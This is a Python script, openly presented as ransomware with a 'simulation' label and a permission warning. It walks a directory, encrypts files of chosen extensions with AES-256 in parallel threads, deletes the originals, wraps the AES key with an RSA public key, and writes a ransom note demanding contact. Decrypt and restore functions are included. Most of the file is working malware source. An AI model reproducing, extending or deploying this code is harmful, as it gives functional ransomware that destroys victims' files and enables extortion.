import os
import random
import time
import threading
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Log configuration
logging.basicConfig(filename='ransomware.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to validate the AES key
def validate_key(key):
    if len(key) != 32:
        raise ValueError("The key must be 256 bits (32 bytes)!")

# Function to encrypt a file using AES
def encrypt_file(file, key):
    try:
        validate_key(key)
        
        # Open the file and read the data
        with open(file, 'rb') as f:
            data = f.read()

        # Configure the AES algorithm in EAX mode (authenticated)
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        # Save the encrypted file (add .encrypted extension)
        with open(file + ".encrypted", 'wb') as f_enc:
            # Save the nonce, tag, and encrypted data in the file
            [f_enc.write(x) for x in (cipher.nonce, tag, ciphertext)]

        # Remove the original file
        os.remove(file)
        print(f"File '{file}' encrypted and removed successfully!")
    except FileNotFoundError:
        logging.error(f"File not found: {file}")
    except PermissionError:
        logging.error(f"Permission denied for the file: {file}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Unknown error encrypting {file}: {e}")

# Function to decrypt a file
def decrypt_file(file, key):
    try:
        validate_key(key)
        
        with open(file, 'rb') as f_enc:
            nonce, tag, ciphertext = [f_enc.read(x) for x in (16, 16, -1)]
            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file.replace(".encrypted", ""), 'wb') as f_out:
            f_out.write(data)
        print(f"File '{file}' decrypted successfully!")
    except FileNotFoundError:
        logging.error(f"File not found: {file}")
    except PermissionError:
        logging.error(f"Permission denied for the file: {file}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Unknown error decrypting {file}: {e}")

# Function to generate a 256-bit key (AES-256)
def generate_key():
    return get_random_bytes(32)  # 256-bit key

# Function to load the RSA public key from a file
def load_public_key(file_path):
    try:
        with open(file_path, 'rb') as f:
            public_key = RSA.import_key(f.read())
        return public_key
    except Exception as e:
        logging.error(f"Error loading RSA public key: {e}")

# Function to encrypt the AES key using RSA
def encrypt_key(symmetric_key, rsa_public_key):
    try:
        cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
        return cipher_rsa.encrypt(symmetric_key)
    except Exception as e:
        logging.error(f"Error encrypting symmetric key with RSA: {e}")

# Function to load extensions from a configuration file
def load_extensions(file_path):
    try:
        with open(file_path, 'r') as f:
            extensions = f.read().splitlines()
        return tuple(extensions)
    except Exception as e:
        logging.error(f"Error loading extensions: {e}")
        return ()

# Function to infect and encrypt files in the directory with threads
def infect(directory, key, extensions):
    try:
        threads = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                full_path = os.path.join(root, file)
                if not file.endswith(".encrypted") and file.lower().endswith(extensions):
                    t = threading.Thread(target=encrypt_file, args=(full_path, key))
                    threads.append(t)
                    t.start()
                    time.sleep(random.uniform(0.1, 0.5))  # Simulate processing time

        for t in threads:
            t.join()

        # Generate the ransom message file
        with open(os.path.join(directory, "README_ENCRYPTED.txt"), "w") as f:
            f.write(ransom_message)
        print("Ransom message created.")
    except Exception as e:
        logging.error(f"Error during infection: {e}")

# Ransom message
ransom_message = """
####################################################
# YOUR FILES HAVE BEEN ENCRYPTED!                  #
# To recover your files, contact us via email:     #
# [FAKE_EMAIL_FOR_EXAMPLE] and follow the          #
# instructions.                                    #
####################################################
"""

# Function to decrypt all files in the directory
def restore_files(directory, key):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".encrypted"):
                    decrypt_file(os.path.join(root, file), key)
    except Exception as e:
        logging.error(f"Error during file restoration: {e}")

if __name__ == "__main__":
    print("WARNING: Do not run this on systems that are not yours without permission.")
    input("Press Enter to continue (or Ctrl+C to cancel)...")
    
    aes_key = generate_key()  # Generate AES key

    # Load the RSA public key from a file
    public_key_path = "path/to/public_key.pem"
    public_key = load_public_key(public_key_path)
    
    # Encrypt the AES key with the RSA public key
    encrypted_aes_key = encrypt_key(aes_key, public_key)

    # Load extensions from a configuration file
    extensions_path = "path/to/extensions.txt"
    extensions = load_extensions(extensions_path)

    # Infect the target directory
    target_directory = "C:\\Users\\YourUser\\Desktop\\TestFolder"  # Replace with your test path
    infect(target_directory, aes_key, extensions)

    # To restore the files later, use the original AES key
    restore_files(target_directory, aes_key)
    
    print("Simulation completed.")